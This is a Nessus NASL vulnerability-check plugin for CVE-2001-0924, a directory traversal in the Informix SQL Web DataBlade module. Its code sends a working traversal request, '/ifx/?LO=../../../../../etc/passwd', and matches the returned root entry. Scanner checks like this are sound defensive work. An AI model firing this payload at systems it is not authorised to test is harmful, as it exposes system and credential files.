#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10805);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-2001-0924");
 script_bugtraq_id(3575);
 script_osvdb_id(672);
 
 script_name(english:"Informix SQL Web DataBlade Module Traversal Arbitrary File Access");
 script_summary(english:"/ifx/?LO=../../../file");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting an application that is affected by a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The Web DataBlade modules for Informix SQL allows an attacker to read
arbitrary files on the remote system by sending a specially crafted
request using '../' characters." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Nov/199" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Informix SQL Web DataBlade Module 4.13 or later, as this
reportedly fixes the issue." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/11/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/11/21");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
  res = http_send_recv3(method:"GET", item:"/ifx/?LO=../../../../../etc/passwd", port:port);
  if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

  if (egrep(pattern:"root:.*0:[01]:.*", string:res[2])) security_warning(port);
}
